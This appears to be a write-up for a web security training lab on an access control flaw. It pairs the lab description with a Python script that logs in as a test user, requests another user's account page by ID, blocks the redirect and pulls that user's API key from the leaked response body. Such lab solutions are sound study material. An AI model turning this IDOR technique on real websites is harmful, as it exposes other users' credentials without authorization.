# User ID controlled by request parameter with data leakage in redirect

> This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.
> To solve the lab, obtain the API key for the user `carlos` and submit it as the solution.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
import sys
from bs4 import BeautifulSoup

BASE_URL = "https://0af500ad037fec7683d5c9e7002a00c6.web-security-academy.net/"

def exploit(url):
    login_endpoint = url + "login"
    session = requests.Session()
    
    # 1. Login
    print(f"[*] Logging in...")
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text,'html.parser')
    token = soup.find("input",{"name":"csrf"})['value']
    
    login_creds = {
        "username":"wiener",
        "password":"peter",
        "csrf":token
    }
    response = session.post(login_endpoint, data=login_creds)
    
    if "Log out" in response.text:
        print("[+] LOGIN SUCCESSFULL")
        
        # 2. Exploit: Request Carlos's ID but STOP the redirect
        myaccount_endpoint = url + "my-account"
        params = {"id": "carlos"}
        
        print("[*] Attempting to capture leaked redirect...")
        # CRITICAL FIX: allow_redirects=False prevents us from losing the leaked data
        response = session.get(myaccount_endpoint, params=params, allow_redirects=False)
        
        # 3. Extract the Key from the 'leaked' 302 body
        if response.status_code == 302:
            print("[+] Redirect captured! Inspecting body...")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Standard parsing for these labs
            apikey = soup.find("div", id="account-content").find('div').text.split(":")[1].strip()
            print(f"[+] FOUND API KEY: {apikey}")
            
            # 4. Submit Solution
            submit_endpoint = url + "submitSolution"
            answer = {"answer": apikey}
            
            print("[*] Submitting solution...")
            final_resp = session.post(submit_endpoint, data=answer)
            
            if "true" in final_resp.text or "Congratulations" in final_resp.text:
                print("[+] SUCCESSFULL: Lab Solved.")
            else:
                print("[-] Submission failed.")
                    
        else:
            print(f"[-] Expected 302 Redirect, got {response.status_code}")

if __name__ == "__main__":
    exploit(BASE_URL)
```